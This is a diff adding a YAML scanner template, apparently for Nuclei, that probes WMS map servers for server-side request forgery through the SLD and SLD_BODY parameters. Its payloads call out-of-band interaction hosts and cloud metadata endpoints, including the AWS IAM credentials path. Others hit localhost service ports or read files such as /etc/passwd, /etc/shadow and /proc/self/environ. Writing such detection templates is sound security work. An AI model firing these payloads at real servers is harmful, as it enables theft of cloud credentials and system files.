@@ -1,0 +1,210 @@
+id: ogc-wms-ssrf-sld
+
+info:
+  name: OGC WMS SSRF via SLD Parameter
+  author: weather-wms-security
+  severity: high
+  description: |
+    Tests for Server-Side Request Forgery (SSRF) vulnerabilities in WMS via
+    the SLD (Styled Layer Descriptor) and SLD_BODY parameters.
+    
+    WMS services that support external SLD references may be tricked into
+    making requests to arbitrary URLs, including:
+    - Internal network services
+    - Cloud metadata endpoints (AWS, GCP, Azure)
+    - Localhost services
+    
+    Uses interactsh for out-of-band (OOB) detection when available.
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+    - https://www.ogc.org/standards/sld
+  tags: ssrf,oob,wms,ogc,sld
+
+variables:
+  base_layer: "gfs_TMP"
+  base_crs: "EPSG:4326"
+  base_bbox: "-180,-90,180,90"
+
+http:
+  # SSRF via SLD parameter with interactsh
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&SLD={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "http://{{interactsh-url}}/style.xml"
+        - "https://{{interactsh-url}}/style.sld"
+        - "http://{{interactsh-url}}:8080/sld"
+        - "http://{{interactsh-url}}/test?param=value"
+
+    attack: batteringram
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+  # SSRF via SLD_BODY parameter with interactsh
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&SLD_BODY={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "http://{{interactsh-url}}/style.xml"
+        - "https://{{interactsh-url}}/test.sld"
+
+    attack: batteringram
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+  # AWS Metadata SSRF
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&SLD={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        - "http://169.254.169.254/latest/user-data"
+        - "http://169.254.169.254/latest/dynamic/instance-identity/document"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "iam"
+          - "security-credentials"
+          - "AccessKeyId"
+          - "SecretAccessKey"
+        condition: or
+
+      - type: regex
+        regex:
+          - "ami-[a-f0-9]+"
+          - "i-[a-f0-9]+"
+
+  # GCP Metadata SSRF
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&SLD={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "http://metadata.google.internal/computeMetadata/v1/"
+        - "http://169.254.169.254/computeMetadata/v1/"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "project-id"
+          - "instance/zone"
+        condition: or
+
+  # Azure Metadata SSRF
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&SLD={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "vmId"
+          - "subscriptionId"
+        condition: or
+
+  # Localhost/Internal SSRF
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&SLD={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "http://127.0.0.1/"
+        - "http://localhost/"
+        - "http://127.0.0.1:8080/"
+        - "http://127.0.0.1:5432/"
+        - "http://127.0.0.1:6379/"
+        - "http://127.0.0.1:9000/"
+        - "http://[::1]/"
+        - "http://0.0.0.0/"
+        - "http://localhost:22/"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SSH-"
+          - "Redis"
+          - "PostgreSQL"
+          - "MinIO"
+        condition: or
+
+      - type: regex
+        regex:
+          - "(?i)220.*FTP"
+          - "(?i)SMTP"
+
+  # File protocol SSRF
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&SLD={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "file:///etc/passwd"
+        - "file:///etc/shadow"
+        - "file:///etc/hosts"
+        - "file:///proc/self/environ"
+        - "file:///proc/self/cmdline"
+        - "file:///C:/Windows/win.ini"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Must be a successful response (not 400/404/500 error)
+      - type: status
+        status:
+          - 200
+      
+      # And contain actual file content indicators
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+          - "daemon:[x*]:"
+          - "\\[extensions\\]"
+          - "for 16-bit app support"
+          - "127\\.0\\.0\\.1\\s+localhost"
+        condition: or
